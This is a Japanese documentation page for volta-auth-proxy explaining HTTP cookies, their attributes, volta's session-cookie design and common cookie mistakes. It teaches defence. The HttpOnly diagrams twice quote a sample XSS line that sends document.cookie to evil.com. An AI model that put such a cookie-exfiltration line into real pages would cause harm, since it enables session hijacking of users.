# Cookie

[English version](cookie.md)

---

## これは何？

Cookieは、ウェブサイトがブラウザに保存を依頼する小さなデータです。そのウェブサイトにリクエストを送るたびに、ブラウザがCookieを自動的に送り返します。ページ読み込みの間にウェブサイトがあなたを「覚えている」のはCookieのおかげです。HTTP自体はステートレス（各リクエストが独立していて、以前のリクエストの記憶がない）だからです。

クラブのハンドスタンプのようなものです。入場時にスタンプを押されます。トイレやバーから戻るたびに、用心棒がスタンプを見てIDを再確認せずに入れてくれます。そのスタンプがCookieです。

---

## なぜ重要なのか？

Cookieがなければ、ウェブサイト上でリンクをクリックするたびにサーバーはあなたが誰か分かりません。すべてのページでログインし直す必要があります。ショッピングカートは空になります。ユーザー設定は常にリセットされます。

Cookieはセキュリティ上の重要な攻撃対象でもあります。攻撃者があなたのCookieを盗めば、攻撃者があなたになります。Cookieの設定を間違えると、傍受されたり、JavaScriptに盗まれたり、間違ったサイトに送られたりします。Cookieの設定を正しくすることは認証セキュリティにとって不可欠です。

---

## どう動くのか？

### Cookieの設定

サーバーがCookieを設定したいとき、レスポンスに`Set-Cookie`ヘッダーを含めます：

```
  HTTP/1.1 200 OK
  Set-Cookie: __volta_session=550e8400-e29b-41d4-a716-446655440000;
              Path=/;
              HttpOnly;
              Secure;
              SameSite=Lax;
              Max-Age=28800
```

ブラウザがこれを保存し、そのドメインへの後続のすべてのリクエストで送り返します：

```
  GET /dashboard HTTP/1.1
  Host: volta.example.com
  Cookie: __volta_session=550e8400-e29b-41d4-a716-446655440000
```

### Cookie属性の解説

| 属性 | 何をするか | 例 | なぜ重要か |
|------|----------|---|----------|
| **HttpOnly** | JavaScriptがこのCookieを読めなくする | `HttpOnly` | XSS攻撃によるセッション窃取を防ぐ。`document.cookie`に表示されない。 |
| **Secure** | HTTPSでのみCookieが送られる | `Secure` | ネットワーク上の攻撃者が平文HTTPでCookieを傍受するのを防ぐ。 |
| **SameSite** | クロスオリジンでのCookie送信を制御 | `SameSite=Lax` | CSRF攻撃を防ぐ。[csrf.md](csrf.md)参照。 |
| **Path** | このパスへのリクエストでのみCookieが送られる | `Path=/` | CookieがどのURLで送られるかを制限。`/`はすべてのパス。 |
| **Domain** | どのドメインがCookieを受け取るか | `Domain=.example.com` | Cookieのスコープを制御。省略すると正確なドメインのみ一致。 |
| **Max-Age** | Cookieが期限切れになるまでの秒数 | `Max-Age=28800` | 28800 = 8時間。その後ブラウザが削除する。 |
| **Expires** | 絶対的な有効期限日 | `Expires=Thu, 01 Jan 2026...` | Max-Ageの代替。両方設定されるとMax-Ageが優先。 |

### HttpOnlyの詳細

```
  HttpOnlyなし：
  ┌─────────────────────────────────────────┐
  │  ブラウザ                                │
  │                                         │
  │  Cookie: session=abc123                 │
  │      ↑                                  │
  │      ├── サーバーが読める  ✓              │
  │      └── JavaScriptが読める  ✓           │
  │          document.cookie → "session=abc" │
  │                                         │
  │  XSS攻撃スクリプト：                      │
  │  fetch("https://evil.com/?c=" +         │
  │        document.cookie)                 │
  │  → セッション窃取！                       │
  └─────────────────────────────────────────┘

  HttpOnlyあり：
  ┌─────────────────────────────────────────┐
  │  ブラウザ                                │
  │                                         │
  │  Cookie: session=abc123 (HttpOnly)      │
  │      ↑                                  │
  │      ├── サーバーが読める  ✓              │
  │      └── JavaScriptが読める  ✗           │
  │          document.cookie → ""           │
  │                                         │
  │  XSS攻撃スクリプト：                      │
  │  fetch("https://evil.com/?c=" +         │
  │        document.cookie)                 │
  │  → 空文字列。セッションは安全。            │
  └─────────────────────────────────────────┘
```

### SameSiteの詳細

完全な説明は[csrf.md](csrf.md)を参照。要約：

- **`Lax`**（voltaの選択）：トップレベルナビゲーション（リンククリック）ではCookieが送られるが、クロスオリジンのPOST/iframe/AJAXでは送られない。通常のリンクナビゲーションを許可しつつ、ほとんどのCSRF攻撃を止める。
- **`Strict`**：クロスオリジンでは絶対にCookieが送られない。最も安全だが、「メールのリンクをクリックしてダッシュボードを見る」フローが壊れる。
- **`None`**：Cookieが常に送られる（古い動作）。`Secure`との併用が必須。

---

## volta-auth-proxyではどう使われているか？

voltaは認証に1つだけCookieを使用します：`__volta_session`。

```
  名前:     __volta_session
  値:       UUID（セッションID、例: 550e8400-e29b-41d4-a716-446655440000）
  HttpOnly: はい（JavaScriptが読めない）
  Secure:   はい（本番ではHTTPSのみ）
  SameSite: Lax（クロスオリジンPOSTをブロック）
  Path:     /
  Max-Age:  28800（8時間、スライディングウィンドウ）
```

### Cookieが保存するもの

Cookie自体にはセッションID（UUID）だけが含まれます。ユーザーデータ、ロール、テナント情報などは含まれません。すべてのセッションデータはPostgreSQLの`sessions`テーブルにあります：

```
  ブラウザのCookie：              サーバー（sessionsテーブル）：
  ┌────────────────────┐         ┌─────────────────────────────┐
  │ 550e8400-e29b-...  │ ─────── │ id: 550e8400-e29b-...       │
  └────────────────────┘         │ user_id: user-uuid           │
                                 │ tenant_id: tenant-uuid       │
    単なるキー。                   │ expires_at: 2026-03-31T17:00│
    データなし。                   │ ip_address: 192.168.1.1     │
    サーバーなしでは               │ user_agent: Chrome/...      │
    役に立たない。                 │ csrf_token: Kj8mX2pQ...    │
                                 └─────────────────────────────┘
```

この設計の意味：

1. **Cookieが盗まれても、攻撃者が得るのはセッションID** -- ユーザーデータではない。サーバーでセッションを無効化できる。
2. **Cookieが小さい** -- UUIDだけなので、4KBのCookieサイズ制限を大幅に下回る。
3. **Cookieを変更せずにセッションデータを更新できる** -- 例：有効期限の延長。

### なぜJWT Cookieを使わないのか

一部のシステムはJWT全体をCookieに保存します。voltaがそうしない理由：

- JWTは大きい（500バイト以上）、クレームが増えるとCookieサイズ制限に近づく。
- JWTは取り消せない。JWTをCookieに保存すると、期限切れまでサーバー側でユーザーをログアウトできない。
- セッションCookieはデータベースからセッションを削除するだけで即座に無効化できる。
- voltaはJWTを別の目的で使用：ヘッダーやAPI呼び出しでアプリに渡す短命トークン。

---

## よくある間違いと攻撃

### 間違い1：HttpOnlyを忘れる

セッションCookieがHttpOnlyでなければ、アプリのどんなXSS脆弱性でも攻撃者がセッションを盗める。最も一般的なWeb脆弱性の1つ。

### 間違い2：本番でSecureを設定しない

`Secure`がないと、CookieがHTTP（HTTPSでなく）で送信される。同じネットワーク（カフェのWiFiなど）の誰でも傍受できる。

### 間違い3：Domainを広く設定しすぎる

`Domain=.example.com`を設定すると、`evil.example.com`にもCookieが送られる。具体的に設定すること。

### 間違い4：有効期限を設定しない

`Max-Age`も`Expires`もないCookieは「セッションCookie」で、ブラウザを閉じると消える。安全に聞こえるが、最新のブラウザは再起動時にセッションCookieを復元することが多い。明示的な有効期限を設定すること。

### 攻撃：XSSによるCookie窃取

HttpOnlyがあっても、XSS脆弱性はCookieを使ったリクエスト（ページからのリクエスト発行）はできるが、Cookie自体を外部に持ち出せない。HttpOnlyは攻撃対象面を縮小するが、XSSリスクを完全には排除しない。

---

## さらに学ぶために

- [MDN: HTTP Cookies](https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies) -- 包括的なリファレンス。
- [session.md](session.md) -- voltaがCookieとセッションをどう使うか。
- [csrf.md](csrf.md) -- SameSite CookieがCSRFを防ぐ方法。
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) -- セキュリティのベストプラクティス。
